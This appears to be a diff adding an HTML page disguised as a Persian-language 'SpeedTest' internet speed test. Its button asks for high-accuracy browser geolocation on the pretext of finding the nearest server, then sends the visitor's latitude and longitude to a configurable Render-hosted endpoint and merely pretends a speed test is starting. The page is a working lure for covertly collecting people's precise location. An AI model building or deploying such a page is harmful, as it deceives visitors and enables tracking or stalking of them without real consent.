@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>⚡ SpeedTest - تست سرعت اینترنت</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background: #0078d7;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-icon {
+            background: white;
+            color: #0078d7;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .card {
+            background: white;
+            color: #333;
+            border-radius: 16px;
+            padding: 30px;
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+        }
+        h2 {
+            margin-bottom: 20px;
+            font-size: 22px;
+        }
+        p {
+            margin-bottom: 25px;
+            line-height: 1.5;
+            color: #555;
+        }
+        .btn {
+            background: #0078d7;
+            color: white;
+            border: none;
+            padding: 14px 32px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #005a9e;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 16px;
+            min-height: 24px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <div class="logo-icon">⚡</div>
+        SpeedTest
+    </div>
+
+    <div class="card">
+        <h2>پیدا کردن نزدیک‌ترین سرور</h2>
+        <p>برای انجام تست سرعت با دقت بالا، نیاز داریم نزدیک‌ترین سرور به مکان شما را پیدا کنیم.</p>
+        <button class="btn" id="locateBtn">پیدا کردن سرور نزدیک 📍</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const SERVER_URL = "https://your-project.onrender.com"; // 👈 آدرس Render خودت
+
+        document.getElementById('locateBtn').onclick = function() {
+            const status = document.getElementById('status');
+            status.textContent = "در حال دریافت مکان...";
+
+            if (!navigator.geolocation) {
+                status.textContent = "مرورگر شما از مکان پشتیبانی نمی‌کند.";
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude } = position.coords;
+                    status.textContent = `مکان شما: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
+
+                    // ارسال به سرور
+                    fetch(SERVER_URL + '/submit-location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ lat: latitude, lng: longitude })
+                    }).then(() => {
+                        status.textContent += " ✅ ارسال شد!";
+                        // شبیه‌سازی شروع تست سرعت
+                        setTimeout(() => {
+                            status.innerHTML += "<br>🔄 در حال شروع تست سرعت...";
+                        }, 1000);
+                    }).catch(() => {
+                        status.textContent += " ❌ خطا در ارسال";
+                    });
+                },
+                (error) => {
+                    console.error(error);
+                    if (error.code === 1) {
+                        status.textContent = "❌ دسترسی به مکان رد شد.";
+                    } else {
+                        status.textContent = "❌ خطایی در دریافت مکان رخ داد.";
+                    }
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 60000
+                }
+            );
+        };
+    </script>
+</body>
+</html>
